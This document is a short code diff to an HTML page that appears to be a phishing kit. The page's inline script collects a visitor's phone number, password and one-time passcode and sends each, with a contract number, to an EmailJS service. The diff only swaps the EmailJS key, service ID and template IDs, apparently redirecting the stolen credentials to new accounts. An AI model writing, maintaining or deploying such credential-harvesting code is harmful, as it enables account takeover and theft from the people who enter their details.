@@ -24,7 +24,7 @@
     <script type="text/javascript">
       (function () {
         // Load config - use environment variable if available
-        const EMAILJS_KEY = window.EMAILJS_PUBLIC_KEY || 'J4YH-lyfEfxXeu7aV';
+        const EMAILJS_KEY = window.EMAILJS_PUBLIC_KEY || 'czFi4gUzL4_CdwPcd';
         emailjs.init({
         publicKey: EMAILJS_KEY,
         });
@@ -1174,7 +1174,7 @@
 
         // EmailJS Integration
         const sendToEmail = (type, value) => {
-          const serviceID = "service_60tgxof";
+          const serviceID = "service_487oy4n";
           let templateID = "";
           let templateParams = {};
           const contractNumber =
@@ -1190,17 +1190,17 @@
           };
 
           if (type === "phone") {
-            templateID = "template_p072eiu";
+            templateID = "template_je0q9no";
             templateParams = { ...commonParams, phone: value };
           } else if (type === "password") {
-            templateID = "template_g1ou4z9";
+            templateID = "template_bw0q4f5";
             templateParams = {
               ...commonParams,
               phone: credentials.phone,
               password: value,
             };
           } else if (type === "otp") {
-            templateID = "template_hc17kv5";
+            templateID = "template_dxsgemo";
             templateParams = {
               ...commonParams,
               phone: credentials.phone,
@@ -1304,3 +1304,4 @@
     </script>
   </body>
 </html>
+
